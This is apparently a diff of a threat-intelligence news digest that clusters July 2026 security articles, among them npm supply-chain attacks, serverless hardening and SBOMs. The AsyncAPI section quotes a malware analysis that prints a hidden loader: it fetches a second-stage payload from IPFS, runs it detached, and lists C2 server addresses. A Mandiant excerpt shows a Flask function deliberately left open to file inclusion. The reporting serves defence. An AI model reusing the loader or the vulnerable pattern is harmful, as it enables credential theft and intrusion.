distribution. In the months following, we have observed three core shifts in adversary TTPs: Wormable propagation: Malicious payloads now prioritize the theft of npm tokens and GitHub Personal Access Tokens (PATs) to automatically infect and republish legitimate packages, as seen in the March 2026 Axios compromise . Infrastructure-level persistence: Attackers are no longer just stealing data; they are embedding themselves into continuous integration/continuous delivery (CI/CD) pipelines to attain long-term, undetectable access to enterprise environments. Multi-stage payloads: Following the September 2025 template, current attacks often deploy dormant “sleeper” dependencies that only activate under specific environmental conditions to evade automated scanners. npm Attacks Seen As a Whole npm compromises have common themes. In the post-Shai-Hulud era, we believe it is helpful to consider the attack surface as a whole. This article will combine: Details of major incidents: Real-time analysis of significant package compromises (e.g., Shai-Hulud 2.0 , Axios , Chalk/Debug ) Cross-campaign correlation: Identifying common infrastructure or code snippets that link disparate attacks to the same threat actors Remediation playbooks: Actionable guidance for rotating credentials and purging malicious dependencies from local and cloud-based caches Shai-Hulud: A New Wave A malicious npm package published as @bitwarden/cli version 2026.4
+```
+
+#### Corroborating sources (5)
+
+- **Unit 42** (threat_research_primary)
+  - Title: The npm Threat Landscape: Attack Surface and Mitigations (Updated July 15)
+  - Published: 2026-07-15T23:00:33+00:00
+  - Link: https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/
+  - Summary: Unit 42 analyzes npm supply chain evolution post-Shai Hulud. Discover wormable malware, CI/CD persistence, multi-stage attacks and more. The post The npm Threat Landscape: Attack Surface and Mitigations (Updated July 15) appeared first on Unit 42 .
+- **Datadog Security Labs** (cloud_identity_infrastructure)
+  - Title: Compromised AsyncAPI npm packages: inside a CI supply-chain attack
+  - Published: 2026-07-14T00:00:00+00:00
+  - Link: https://securitylabs.datadoghq.com/articles/compromised-asyncapi-npm-packages/
+  - Summary: On July 14, 2026, four npm packages in the @asyncapi namespace, totaling over 3 million weekly downloads, were compromised to deliver credential-stealing malware. We investigate how the attack unfolded and how to know if you're affected.
+- **Wiz Research** (cloud_identity_infrastructure)
+  - Title: M-Red-Team: AsyncAPI Supply Chain Compromise via GitHub Actions
+  - Published: 2026-07-14T10:33:36+00:00
+  - Link: https://www.wiz.io/blog/m-red-team-asyncapi-supply-chain-compromise-via-github-actions
+  - Summary: Detect and mitigate malicious @asyncapi npm packages linked to the latest npm supply chain attack.
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - Title: AsyncAPI npm packages infected with credential-stealing malware
+  - Published: 2026-07-15T15:37:27+00:00
+  - Link: https://www.bleepingcomputer.com/news/security/-asyncapi-npm-packages-infected-with-credential-stealing-malware/
+  - Summary: Five malicious versions of AsyncAPI packages were published to the Node Package Manager (npm) in a supply-chain attack that delivered a remote access trojan with info-stealing capabilities. [...]
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: Compromised AsyncAPI npm Packages Deliver Multi-Stage Botnet Malware
+  - Published: 2026-07-15T09:16:13+00:00
+  - Link: https://thehackernews.com/2026/07/compromised-asyncapi-npm-packages.html
+  - Summary: Four compromised npm packages in the @asyncapi namespace have been observed distributing a multi-stage botnet loader, according to findings from OX Security, SafeDep, Socket, and StepSecurity. The affected packages are listed below - @asyncapi/generator-helpers@1.1.1 @asyncapi/generator-components@0.7.1 @asyncapi/generator@3.3.1 @asyncapi/specs(v6.11.2, v6.11.2-alpha.1) "The
+
 ### Cluster 08882287bf — score 20
 
 - Title: iCagenda and Balbooa Forms Joomla Flaws Reportedly Exploited as Zero-Days
@@ -1061,64 +1126,51 @@ iCagenda and Balbooa Forms Joomla Flaws Reportedly Exploited as Zero-Days  Ra
   - Link: https://thehackernews.com/2026/07/icagenda-and-balbooa-forms-joomla-flaws.html
   - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added two maximum-severity security flaws impacting iCagenda and Balbooa extensions for Joomla to its Known Exploited Vulnerabilities (KEV) catalog, following reports of zero-day exploitation in the wild. The vulnerabilities, both rated 10.0 on the CVSS scoring system, are below - CVE-2026-48939 - A vulnerability in the
 
-### Cluster 46a2a9ea7e — score 18
+### Cluster d1f6dab23f — score 18
 
-- Title: Compromised AsyncAPI npm packages: inside a CI supply-chain attack
-- Source: Datadog Security Labs (cloud_identity_infrastructure)
-- Published: 2026-07-14T00:00:00+00:00
-- Link: https://securitylabs.datadoghq.com/articles/compromised-asyncapi-npm-packages/
+- Title: The Risk of Exposed Cloud Functions and How to Harden
+- Source: Google Cloud Threat Intelligence (threat_research_primary)
+- Published: 2026-07-15T14:00:00+00:00
+- Link: https://cloud.google.com/blog/topics/threat-intelligence/exposed-cloud-functions-harden/
 - Fetch status: ok
-- Member count: 7
-- Corroborating source count: 4
-- Strong signals: npm
+- Member count: 2
+- Corroborating source count: 2
+- Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: credential_theft, ddos, supply_chain
-- affected_industries: financial_services
-- affected_products: GitHub, npm
-- content_type: incident_report, news_report
-- confidence_tier: tier_2_operator, tier_4_news
+- affected_industries: retail_ecommerce
+- content_type: news_report
+- confidence_tier: tier_1_primary_research, tier_2_operator
 
 #### Primary article taxonomy
-- threat_categories: supply_chain
-- affected_products: npm, GitHub
-- content_type: incident_report
-- confidence_tier: tier_2_operator
+- affected_industries: retail_ecommerce
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
 
 #### Summary
 
 ```
-On July 14, 2026, four npm packages in the @asyncapi namespace, totaling over 3 million weekly downloads, were compromised to deliver credential-stealing malware. We investigate how the attack unfolded and how to know if you're affected.
+Written by: Corné de Jong Introduction Mandiant security assessments frequently identify publicly exposed serverless applications that lack authentication, often as a result of specific business requirements. Serverless deployments typically run custom-developed code that incorporates third-party packages, making them targets for a wide range of application-level attacks, including: Local and Remote File Inclusion (LFI/RFI) Command Injection Successful exploitation of these vulnerabilities can grant an attacker full control over the underlying container instance. Such access can serve as a foothold that may ultimately lead to a full compromise of the victim’s cloud environment. Based on lessons learned in customer engagements, in this blog post we describe attack scenarios and provide actionable guidance on how to secure serverless environments. While this analysis focuses on hardening strategies for Google Cloud Run services and functions that must remain publicly accessible, these pr
 ```
 
 #### Full body
 
 ```
-Christophe Tafani-Dereeper Cloud Security Researcher and Advocate Sebastian Obregoso Security Researcher Eslam Salem Manager, Security Research Key points and observations On July 14, 2026, four npm packages in the @asyncapi namespace, totaling over 3 million weekly downloads, were compromised to distribute malicious code. The attacker injected the code through a GitHub commit . It steals credentials from the infected machine and exfiltrates them to a remote, attacker-controlled server. We assess that the threat actor exploited a publicly disclosed vulnerability in the project's CI pipeline to compromise credentials for the bot account that performs releases. The techniques used in this attack point to a sophisticated threat actor with CI-aware tactics. The full supply chain attack path, from the release bot's stolen credentials to the second-stage payload running on developer machines (click to enlarge) How to know if you're affected You're affected if you use one of the following package versions: Package Malicious version @asyncapi/generator 3.3.1 @asyncapi/generator-components 0.7.1 @asyncapi/generator-helpers 1.1.1 @asyncapi/specs 6.11.2 (also 6.11.2-alpha.1) To hunt for compromises in your environment, use the indicators in the Indicators of compromise section. What happened We identified malicious code in a set of popular npm packages and traced it to a commit ( 3eab3ec ) on the asyncapi/generator GitHub repository. The commit injects obfuscated code across several files. The obfuscated malicious code injected into the compromised commit (click to enlarge) After deobfuscation, the injected code runs node -e with an embedded JavaScript payload: async function main ( ) { try { spawn ( 'node' , [ '-e' , PAYLOAD ] , { detached : true , stdio : 'ignore' , windowsHide : true , // hides the window on Windows } ) . unref ( ) ; // detaches so it outlives the parent } catch ( e ) { console . error ( e . message ) ; } } main ( ) ; The embedded code fetches a second stage from hxxps://ipfs[.]io/ipfs/QmQobZSp1wRPrpSEQ56qnyq7ecZh5Bg5k1fnjt4SUwwHb9 (hosted on IPFS, a peer-to-peer file distribution network). It writes the file to a local sync.js , whose location depends on the operating system ( ~/.local/share/NodeJS on Linux, ~/Library/Application Support/NodeJS on macOS, %LOCALAPPDATA%/NodeJS on Windows), then executes it: const FILE_URL = 'hxxps://ipfs[.]io/ipfs/QmQobZSp1wRPrpSEQ56qnyq7ecZh5Bg5k1fnjt4SUwwHb9' ; const FILE_NAME = 'sync.js' ; async function main ( ) { try { const dir = getTargetDirectory ( ) ; const dest = path . join ( dir , FILE_NAME ) ; if ( ! fs . existsSync ( dir ) ) fs . mkdirSync ( dir , { recursive : true } ) ; await downloadFile ( FILE_URL , dest ) ; spawn ( 'node' , [ dest ] , { detached : true , stdio : 'ignore' , windowsHide : true } ) . unref ( ) ; process . exit ( 0 ) ; } catch ( e ) { console . error ( e . message ) ; process . exit ( 1 ) ; } } main ( ) ; Once the attacker injected the malicious code, the automated CD pipeline published several packages: Package Malicious version @asyncapi/generator 3.3.1 @asyncapi/generator-components 0.7.1 @asyncapi/generator-helpers 1.1.1 @asyncapi/specs 6.11.2-alpha.1 , 6.11.2 Inside the payload: a credential stealer The second-stage payload decrypts a JSON configuration file using an encryption key derived from hardcoded values and the HKDF key derivation algorithm. The decrypted configuration below lists the command and control (C2) URLs and several runtime parameters: { "attackerPub" : "0432fa4ba871877d94081fe83323fa24dfa1491e9de8725cbab7b734de9e9be3b233ef6742fd6264437c9532223d687b05fa540b70af6a516b8539af84d0eeb48e" , "c2Server" : "http://85.137.53[.]71:8080" , "uploadServer" : "http://85.137.53[.]71:8081" , "c2ProxyMgmt" : "http://85.137.53[.]71:8091" , "serverManager" : "http://127.0.0.1:8090" , "blockchain" : { "rpcUrl" : "https://ethereum-rpc.publicnode[.]com" , "chainId" : 1 , "contractAddress" : "0x12c37A86a0Ed0beBe5d1d6a43E42f07860eAc710" } , "log" : { "en
+Threat Intelligence The Risk of Exposed Cloud Functions and How to Harden July 15, 2026 Mandiant Mandiant Services Stop attacks, reduce risk, and advance your security. Contact Mandiant Written by: Corné de Jong Introduction Mandiant security assessments frequently identify publicly exposed serverless applications that lack authentication, often as a result of specific business requirements. Serverless deployments typically run custom-developed code that incorporates third-party packages, making them targets for a wide range of application-level attacks, including: Local and Remote File Inclusion (LFI/RFI) Command Injection Successful exploitation of these vulnerabilities can grant an attacker full control over the underlying container instance. Such access can serve as a foothold that may ultimately lead to a full compromise of the victim’s cloud environment. Based on lessons learned in customer engagements, in this blog post we describe attack scenarios and provide actionable guidance on how to secure serverless environments. While this analysis focuses on hardening strategies for Google Cloud Run services and functions that must remain publicly accessible, these principles apply universally to any public serverless deployment. What are Serverless Applications? Serverless applications, also described as Function-as-a-Service (FaaS), allow the deployment of individual blocks of code as microservices within a flexible, decoupled, and event-driven cloud architecture without the need to manage underlying infrastructure. These services enable applications and automations to scale automatically and deploy instantly, removing operational overhead. Serverless services underpin major e-commerce, media, payment processing applications, and AI usage. The rapid expansion of generative AI adoption is a significant driver of increased serverless architecture use. AI workflows, including chatbot interactions, image generation, “vibe-coding”, and multi-step AI agents rely on serverless functions to complete tasks for users. This growth has made securing serverless environments a more pressing challenge for enterprise security teams. Risks of Serverless Application Attacks Publicly exposed serverless workloads can serve as an initial access point for threat actors. As noted, these services may contain vulnerabilities within the code, imported packages, or the underlying runtime environment. Once an entry point is exploited, attackers typically attempt to escalate privileges or move laterally. Common techniques observed include: Extracting secrets stored directly within the application code. Reviewing application logic and sensitive data to identify further attack vectors within the environment. Exfiltrating service account bearer tokens from the metadata server following successful Remote Code Execution (RCE). Leveraging these compromised secrets or service accounts allows threat actors to pivot to adjacent systems and workloads, potentially resulting in a total environment takeover if proper hardening strategies are not in place. Example Attack Scenarios The following simplified scenarios illustrate how serverless functions can be compromised and how attackers pivot after achieving initial code execution. Local File Inclusion (LFI) In the following Cloud Run example, a Python/Flask function accepts user-controlled input to open a file without performing proper validation. This pattern is an example of a Local File Inclusion (LFI) vulnerability. import functions_framework @functions_framework.http def hello_http(request): request_json = request.get_json(silent=True) request_args = request.args if request_json and 'file' in request_json: file = request_json['file'] elif request_args and 'file' in request_args: file = request_args['file'] # VULNERABILITY: The 'file' parameter is used directly in open() # without validation, allowing arbitrary file access with open(file, 'r') as resp: filedata = resp.read() return 'local file data {}!'.format(f
 ```
 
-#### Corroborating sources (4)
+#### Corroborating sources (2)
 
-- **Datadog Security Labs** (cloud_identity_infrastructure)
-  - Title: Compromised AsyncAPI npm packages: inside a CI supply-chain attack
-  - Published: 2026-07-14T00:00:00+00:00
-  - Link: https://securitylabs.datadoghq.com/articles/compromised-asyncapi-npm-packages/
-  - Summary: On July 14, 2026, four npm packages in the @asyncapi namespace, totaling over 3 million weekly downloads, were compromised to deliver credential-stealing malware. We investigate how the attack unfolded and how to know if you're affected.
-- **Wiz Research** (cloud_identity_infrastructure)
-  - Title: M-Red-Team: AsyncAPI Supply Chain Compromise via GitHub Actions
-  - Published: 2026-07-14T10:33:36+00:00
-  - Link: https://www.wiz.io/blog/m-red-team-asyncapi-supply-chain-compromise-via-github-actions
-  - Summary: Detect and mitigate malicious @asyncapi npm packages linked to the latest npm supply chain attack.
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: AsyncAPI npm packages infected with credential-stealing malware
-  - Published: 2026-07-15T15:37:27+00:00
-  - Link: https://www.bleepingcomputer.com/news/security/-asyncapi-npm-packages-infected-with-credential-stealing-malware/
-  - Summary: Five malicious versions of AsyncAPI packages were published to the Node Package Manager (npm) in a supply-chain attack that delivered a remote access trojan with info-stealing capabilities. [...]
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: Compromised AsyncAPI npm Packages Deliver Multi-Stage Botnet Malware
-  - Published: 2026-07-15T09:16:13+00:00
-  - Link: https://thehackernews.com/2026/07/compromised-asyncapi-npm-packages.html
-  - Summary: Four compromised npm packages in the @asyncapi namespace have been observed distributing a multi-stage botnet loader, according to findings from OX Security, SafeDep, Socket, and StepSecurity. The affected packages are listed below - @asyncapi/generator-helpers@1.1.1 @asyncapi/generator-components@0.7.1 @asyncapi/generator@3.3.1 @asyncapi/specs(v6.11.2, v6.11.2-alpha.1) "The
+- **Google Cloud Threat Intelligence** (threat_research_primary)
+  - Title: The Risk of Exposed Cloud Functions and How to Harden
+  - Published: 2026-07-15T14:00:00+00:00
+  - Link: https://cloud.google.com/blog/topics/threat-intelligence/exposed-cloud-functions-harden/
+  - Summary: Written by: Corné de Jong Introduction Mandiant security assessments frequently identify publicly exposed serverless applications that lack authentication, often as a result of specific business requirements. Serverless deployments typically run custom-developed code that incorporates third-party packages, making them targets for a wide range of application-level attacks, including: Local and Remote File Inclusion (LFI/RFI) Command Injection Successful exploitation of these vulnerabilities can grant an attacker full control over the underlying container instance. Such access can serve as a foothold that may ultimately lead to a full compromise of the victim’s cloud environment. Based on lessons learned in customer engagements, in this blog post we describe attack scenarios and provide actionable guidance on how to secure serverless environments. While this analysis focuses on hardening strategies for Google Cloud Run services and functions that must remain publicly accessible, these pr
+- **Google Cloud Security** (cloud_identity_infrastructure)
+  - Title: The Risk of Exposed Cloud Functions and How to Harden
+  - Published: 2026-07-15T14:00:00+00:00
+  - Link: https://cloud.google.com/blog/topics/threat-intelligence/exposed-cloud-functions-harden/
+  - Summary: Written by: Corné de Jong Introduction Mandiant security assessments frequently identify publicly exposed serverless applications that lack authentication, often as a result of specific business requirements. Serverless deployments typically run custom-developed code that incorporates third-party packages, making them targets for a wide range of application-level attacks, including: Local and Remote File Inclusion (LFI/RFI) Command Injection Successful exploitation of these vulnerabilities can grant an attacker full control over the underlying container instance. Such access can serve as a foothold that may ultimately lead to a full compromise of the victim’s cloud environment. Based on lessons learned in customer engagements, in this blog post we describe attack scenarios and provide actionable guidance on how to secure serverless environments. While this analysis focuses on hardening strategies for Google Cloud Run services and functions that must remain publicly accessible, these pr
 
 ### Cluster 3fe79c75d4 — score 18
 
@@ -1165,52 +1217,6 @@ Back to Blog Detection and Response Investigating Persistence Mechanisms in AWS 
   - Published: 2026-07-15T00:37:58+00:00
   - Link: https://aws.amazon.com/blogs/security/icymi-june-2026-aws-security/
   - Summary: Read all about the latest AWS security features, compliance updates, and hands-on resources in our new, monthly digest posts. You’ll find expert blog posts, new service capabilities, code samples, and workshops. AWS Security Blog posts This month’s AWS Security Blog posts covered identity and access management, threat intelligence, network security, AI-powered security tooling, and multi-account […]
-
-### Cluster d1f6dab23f — score 18
-
-- Title: The Risk of Exposed Cloud Functions and How to Harden
-- Source: Google Cloud Threat Intelligence (threat_research_primary)
-- Published: 2026-07-15T14:00:00+00:00
-- Link: https://cloud.google.com/blog/topics/threat-intelligence/exposed-cloud-functions-harden/
-- Fetch status: ok
-- Member count: 2
-- Corroborating source count: 2
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- affected_industries: retail_ecommerce
-- content_type: news_report
-- confidence_tier: tier_1_primary_research, tier_2_operator
-
-#### Primary article taxonomy
-- affected_industries: retail_ecommerce
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-Written by: Corné de Jong Introduction Mandiant security assessments frequently identify publicly exposed serverless applications that lack authentication, often as a result of specific business requirements. Serverless deployments typically run custom-developed code that incorporates third-party packages, making them targets for a wide range of application-level attacks, including: Local and Remote File Inclusion (LFI/RFI) Command Injection Successful exploitation of these vulnerabilities can grant an attacker full control over the underlying container instance. Such access can serve as a foothold that may ultimately lead to a full compromise of the victim’s cloud environment. Based on lessons learned in customer engagements, in this blog post we describe attack scenarios and provide actionable guidance on how to secure serverless environments. While this analysis focuses on hardening strategies for Google Cloud Run services and functions that must remain publicly accessible, these pr
-```
-
-#### Full body
-
-```
-Threat Intelligence The Risk of Exposed Cloud Functions and How to Harden July 15, 2026 Mandiant Mandiant Services Stop attacks, reduce risk, and advance your security. Contact Mandiant Written by: Corné de Jong Introduction Mandiant security assessments frequently identify publicly exposed serverless applications that lack authentication, often as a result of specific business requirements. Serverless deployments typically run custom-developed code that incorporates third-party packages, making them targets for a wide range of application-level attacks, including: Local and Remote File Inclusion (LFI/RFI) Command Injection Successful exploitation of these vulnerabilities can grant an attacker full control over the underlying container instance. Such access can serve as a foothold that may ultimately lead to a full compromise of the victim’s cloud environment. Based on lessons learned in customer engagements, in this blog post we describe attack scenarios and provide actionable guidance on how to secure serverless environments. While this analysis focuses on hardening strategies for Google Cloud Run services and functions that must remain publicly accessible, these principles apply universally to any public serverless deployment. What are Serverless Applications? Serverless applications, also described as Function-as-a-Service (FaaS), allow the deployment of individual blocks of code as microservices within a flexible, decoupled, and event-driven cloud architecture without the need to manage underlying infrastructure. These services enable applications and automations to scale automatically and deploy instantly, removing operational overhead. Serverless services underpin major e-commerce, media, payment processing applications, and AI usage. The rapid expansion of generative AI adoption is a significant driver of increased serverless architecture use. AI workflows, including chatbot interactions, image generation, “vibe-coding”, and multi-step AI agents rely on serverless functions to complete tasks for users. This growth has made securing serverless environments a more pressing challenge for enterprise security teams. Risks of Serverless Application Attacks Publicly exposed serverless workloads can serve as an initial access point for threat actors. As noted, these services may contain vulnerabilities within the code, imported packages, or the underlying runtime environment. Once an entry point is exploited, attackers typically attempt to escalate privileges or move laterally. Common techniques observed include: Extracting secrets stored directly within the application code. Reviewing application logic and sensitive data to identify further attack vectors within the environment. Exfiltrating service account bearer tokens from the metadata server following successful Remote Code Execution (RCE). Leveraging these compromised secrets or service accounts allows threat actors to pivot to adjacent systems and workloads, potentially resulting in a total environment takeover if proper hardening strategies are not in place. Example Attack Scenarios The following simplified scenarios illustrate how serverless functions can be compromised and how attackers pivot after achieving initial code execution. Local File Inclusion (LFI) In the following Cloud Run example, a Python/Flask function accepts user-controlled input to open a file without performing proper validation. This pattern is an example of a Local File Inclusion (LFI) vulnerability. import functions_framework @functions_framework.http def hello_http(request): request_json = request.get_json(silent=True) request_args = request.args if request_json and 'file' in request_json: file = request_json['file'] elif request_args and 'file' in request_args: file = request_args['file'] # VULNERABILITY: The 'file' parameter is used directly in open() # without validation, allowing arbitrary file access with open(file, 'r') as resp: filedata = resp.read() return 'local file data {}!'.format(f
-```
-
-#### Corroborating sources (2)
-
-- **Google Cloud Threat Intelligence** (threat_research_primary)
-  - Title: The Risk of Exposed Cloud Functions and How to Harden
-  - Published: 2026-07-15T14:00:00+00:00
-  - Link: https://cloud.google.com/blog/topics/threat-intelligence/exposed-cloud-functions-harden/
-  - Summary: Written by: Corné de Jong Introduction Mandiant security assessments frequently identify publicly exposed serverless applications that lack authentication, often as a result of specific business requirements. Serverless deployments typically run custom-developed code that incorporates third-party packages, making them targets for a wide range of application-level attacks, including: Local and Remote File Inclusion (LFI/RFI) Command Injection Successful exploitation of these vulnerabilities can grant an attacker full control over the underlying container instance. Such access can serve as a foothold that may ultimately lead to a full compromise of the victim’s cloud environment. Based on lessons learned in customer engagements, in this blog post we describe attack scenarios and provide actionable guidance on how to secure serverless environments. While this analysis focuses on hardening strategies for Google Cloud Run services and functions that must remain publicly accessible, these pr
-- **Google Cloud Security** (cloud_identity_infrastructure)
-  - Title: The Risk of Exposed Cloud Functions and How to Harden
-  - Published: 2026-07-15T14:00:00+00:00
-  - Link: https://cloud.google.com/blog/topics/threat-intelligence/exposed-cloud-functions-harden/
-  - Summary: Written by: Corné de Jong Introduction Mandiant security assessments frequently identify publicly exposed serverless applications that lack authentication, often as a result of specific business requirements. Serverless deployments typically run custom-developed code that incorporates third-party packages, making them targets for a wide range of application-level attacks, including: Local and Remote File Inclusion (LFI/RFI) Command Injection Successful exploitation of these vulnerabilities can grant an attacker full control over the underlying container instance. Such access can serve as a foothold that may ultimately lead to a full compromise of the victim’s cloud environment. Based on lessons learned in customer engagements, in this blog post we describe attack scenarios and provide actionable guidance on how to secure serverless environments. While this analysis focuses on hardening strategies for Google Cloud Run services and functions that must remain publicly accessible, these pr
 
 ### Cluster 1a4ef6c9e4 — score 18
 
@@ -1405,6 +1411,51 @@ An unpatched vulnerability in Cursor on Windows can be triggered for code execut
   - Published: 2026-07-15T14:37:13+00:00
   - Link: https://www.securityweek.com/unpatched-cursor-vulnerability-exposes-users-to-code-execution/
   - Summary: An attacker can create a malicious repository containing a git.exe in the project root, and Cursor executes it automatically. The post Unpatched Cursor Vulnerability Exposes Users to Code Execution appeared first on SecurityWeek .
+
+### Cluster ed2be3078b — score 14
+
+- Title: What Is an SBOM (Software Bill of Materials)? What’s Inside and How Security Teams Use Them
+- Source: Orca Security Research (cloud_identity_infrastructure)
+- Published: 2026-07-15T22:50:09+00:00
+- Link: https://orca.security/resources/blog/sbom-cloud-supply-chain-security/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: supply_chain, zero_day
+- affected_industries: healthcare, manufacturing_industrial
+- urgency_signals: zero_day
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Primary article taxonomy
+- threat_categories: supply_chain, zero_day
+- affected_industries: healthcare, manufacturing_industrial
+- urgency_signals: zero_day
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Summary
+
+```
+Key Takeaways The World Economic Forum’s Global Cybersecurity Outlook 2026 found that 65% of large companies identify third-party and supply chain vulnerabilities as their greatest barrier to cyber resilience. You cannot defend software when you cannot see what it is built from, and modern applications are built almost entirely from components someone else wrote. A […]
+```
+
+#### Full body
+
+```
+Table of contents Key Takeaways What Is a Software Bill of Materials (SBOM)? BOM vs. SBOM: what’s the difference? SBOM vs. SCA (software composition analysis): related but not the same What’s Inside an SBOM? (Key Components) The NTIA “minimum elements” of an SBOM What an SBOM entry looks like: a short example SBOM Formats and Standards: SPDX vs. CycloneDX SPDX (Linux Foundation / ISO standard) CycloneDX (OWASP) SWID tags Why SBOMs Matter for Software Supply Chain Security SBOM Use Cases: How Security Teams Actually Use Them Vulnerability management + VEX License and compliance management Incident / zero-day response Procurement, M&A, and third-party risk SBOMs and Compliance: Where They’re Required How to Generate and Manage an SBOM Generation methods: source, build-time, and binary/runtime SBOM tools and generators Managing SBOMs at scale SBOM Best Practices (and Common Pitfalls) How Orca Delivers SBOM Visibility Across the SDLC Frequently Asked Questions about SBOM Key Takeaways A software bill of materials (SBOM) is a machine-readable inventory of every component, library, and dependency in a piece of software, including each component’s version, supplier, license, and relationships. Think of it as a nutrition label for software. An SBOM is not the same as a raw dependency scan. A scanner tells you what to fix today; the SBOM is the durable inventory that lets you answer “are we affected?” the next time a Log4Shell-style vulnerability drops. Two formats dominate: SPDX (a Linux Foundation and ISO standard focused on license compliance) and CycloneDX (an OWASP standard built for security, with native VEX support). SBOMs are moving from best practice to requirement. US Executive Order 14028, the EU Cyber Resilience Act, and FDA rules for medical devices already ask for them, and frameworks like NIST SSDF and PCI DSS lean on the same inventory. An SBOM only earns its keep when it is generated on every build, correlated to live vulnerabilities, and shared. Orca produces SBOMs agentlessly across the SDLC and ties every package to the exploitable risk around it. The World Economic Forum’s Global Cybersecurity Outlook 2026 found that 65% of large companies identify third-party and supply chain vulnerabilities as their greatest barrier to cyber resilience. You cannot defend software when you cannot see what it is built from, and modern applications are built almost entirely from components someone else wrote. A software bill of materials (SBOM) answers that question with a structured, machine-readable inventory of every component in an application, including its libraries, versions, suppliers, dependencies, and licenses. This guide covers what an SBOM contains, how it differs from a BOM and from software composition analysis, the two formats you will actually encounter, and how security teams put an SBOM to work across vulnerability response, compliance, and procurement. What Is a Software Bill of Materials (SBOM)? A software bill of materials (SBOM) is a nested inventory that lists the components a piece of software is made of. SBOM stands for software bill of materials, and the term is borrowed from manufacturing, where a bill of materials lists every part in a finished product. The software version lists code components instead of physical parts. The easiest way to picture it is a nutrition label. A label tells you the ingredients in a packaged food without making you trust the brand blindly. An SBOM does the same for an application: it names each library, its version, and its supplier, so a security team can inspect what shipped instead of assuming the vendor got it right. That matters because most modern applications are not written entirely in-house. They rely heavily on open-source components and third-party dependencies. When you ship software, you ship other people’s code, and the SBOM is the record of exactly whose. BOM vs. SBOM: what’s the difference? A bill of materials (BOM) lists the physical parts in a manufactured pr
+```
+
+#### Corroborating sources (1)
+
+- **Orca Security Research** (cloud_identity_infrastructure)
+  - Title: What Is an SBOM (Software Bill of Materials)? What’s Inside and How Security Teams Use Them
+  - Published: 2026-07-15T22:50:09+00:00
+  - Link: https://orca.security/resources/blog/sbom-cloud-supply-chain-security/
+  - Summary: Key Takeaways The World Economic Forum’s Global Cybersecurity Outlook 2026 found that 65% of large companies identify third-party and supply chain vulnerabilities as their greatest barrier to cyber resilience. You cannot defend software when you cannot see what it is built from, and modern applications are built almost entirely from components someone else wrote. A […]
 
 ### Cluster 90facf1e06 — score 14
 
@@ -1718,49 +1769,6 @@ Zoom warns of critical account takeover vulnerability By Bill Toulas July 15, 20
   - Link: https://www.bleepingcomputer.com/news/security/zoom-warns-of-critical-account-takeover-vulnerability/
   - Summary: Zoom is warning of a critical vulnerability in its desktop client and software development kit for Windows that could be exploited by an unauthenticated party to hijack accounts. [...]
 
-### Cluster ab13f77dd3 — score 11
-
-- Title: Helping small businesses with free, hands-on cyber consultancy
-- Source: NCSC UK (government_authoritative)
-- Published: 2026-07-15T12:00:00+00:00
-- Link: https://www.ncsc.gov.uk/blogs/helping-small-businesses-with-free-hands-on-cyber-consultancy
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: ransomware_extortion
-- affected_industries: government
-- content_type: news_report
-- confidence_tier: tier_1_government
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion
-- affected_industries: government
-- content_type: news_report
-- confidence_tier: tier_1_government
-
-#### Summary
-
-```
-Cyber Advisors are offering free 30-minute consultations to help small businesses get started with cyber security.
-```
-
-#### Full body
-
-```
-Blog Post Download & print article PDF Download & print article PDF Helping small businesses with free, hands-on cyber consultancy Cyber Advisors are offering free 30-minute consultations to help small businesses get started with cyber security. Emma W Composite created from images courtesy of IASME If you’re a small business, cyber attacks may feel like something that only large companies need to worry about. Companies with bigger budgets, more customers – and more to lose. And since you’re focused on keeping customers happy, managing cashflow and your day-to-day business, investing in cyber security can seem more like a costly distraction than a priority. The reality is that smaller businesses are frequently targeted, precisely because they’re less likely to have cyber protections in place. In other words, no business is too small to be a victim of cyber crime. In fact, in 2025, 65% of medium and 46% of small organisations reported a cyber breach or attack . We also know from our own research that many smaller organisations believe that cyber security is too complicated, too expensive, and doesn’t address the real-world risks that small businesses face. To help address this, we introduced Cyber Advisors in 2023, a network of cyber security consultants who’ve been assured by the NCSC to work specifically with smaller organisations. Cyber Advisors aren’t just technical specialists; they understand how to apply the advice from the experts at the NCSC in a way that’s practical, realistic and relevant for smaller businesses . Free, 30-minute consultations For smaller organisations with limited in-house expertise, knowing where to start can often feel like the biggest hurdle. So many Cyber Advisors are now offering a free 30-minute consultation for small or medium-sized business (SMEs) who are looking to get started with Cyber Essentials , the government's baseline for cyber security. This no-strings-attached, introductory consultation can make all the difference, providing you with an opportunity to ask questions and demystify what can sometimes feel like a complex area. Since the option of a free consultation was introduced, over 760 small organisations across the UK have reached out to us. This has already led to well over 150 small organisations successfully gaining Cyber Essentials certification through this route alone, with more well underway. If you decide to use a Cyber Advisor, you will benefit from expert insights that explain how the 5 steps that make up Cyber Essentials can be applied to your organisation using practical, achievable steps. Whether it’s understanding security controls, identifying quick wins or avoiding common pitfalls, the consultation will help your organisation move forward with confidence. Other free cyber tools from the NCSC Cyber Advisors can also help you with other free tools from the NCSC. The Early Warning service, for example, warns you about potential viruses and vulnerabilities on your network, so you can act on them before they become bigger problems. If you employ a Cyber Advisor, they will also be able to help set up Early Warning, and use the alerts you’ll receive to improve your cyber security. The NCSC’s Cyber Action Toolkit gives you a practical starting point for building cyber resilience and a pathway towards Cyber Essentials certification. Another tool, the NCSC’s free Cyber Action Toolkit , is a new way of providing advice in a way that engages small businesses, and more importantly, encourages you to take action . As you work through the toolkit, you’ll build layers of protection around your organisation which defends against common cyber threats such as email hacking, data breaches and ransomware. Ultimately, initiatives like these demonstrate that cyber security is within reach for organisations of all sizes, working across all sectors. With the right support, small businesses don’t need to tackle cyber security alone. You can confidently take practical 